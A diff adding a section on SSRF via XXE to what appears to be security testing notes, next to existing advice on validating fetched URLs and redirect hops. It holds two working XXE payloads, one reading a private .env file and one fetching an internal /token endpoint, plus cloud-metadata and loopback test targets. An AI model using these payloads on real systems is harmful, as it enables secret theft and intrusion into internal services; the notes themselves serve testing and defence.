@@ -23,6 +23,35 @@ An allowlist of known destinations, keyed by an opaque name the client picks —
 - Limit request duration and response size
 - **Validate scheme, host, port, and the resolved address, including every redirect hop** — a URL that resolves to a public hostname at check-time can still redirect to `169.254.169.254` or `127.0.0.1` at fetch-time (DNS rebinding / open-redirect-to-SSRF)
 
+## SSRF via XXE
+
+XXE (XML External Entity injection) can become SSRF — the XML parser respects `SYSTEM` entities that point to URLs, so the server makes the fetch on your behalf.
+
+**File read via XXE:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE course [
+  <!ENTITY demo SYSTEM "file:///app/private/demo.env">
+]>
+<course><code>&demo;</code></course>
+```
+
+The application parses this and the entity declaration forces the server to read the file locally.
+
+**SSRF via XXE (reaching internal services):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE course [
+  <!ENTITY demo SYSTEM "http://internal-service:9000/token">
+]>
+<course><code>&demo;</code></course>
+```
+
+The server fetches from the internal URL, and the response is embedded in the parsed output. This bypasses firewall rules that would block direct requests from outside.
+
+---
+
 ## Testing
 - Any feature that fetches a URL server-side on your behalf — webhooks, "import from URL," PDF/screenshot generators, link previews, SSO/OAuth discovery endpoints
+- XML parsers that accept external entities (see [[XXE Injection]])
 - Try internal/loopback targets (`127.0.0.1`, `169.254.169.254` for cloud metadata, `localhost`, internal hostnames) and see what comes back in the response or timing
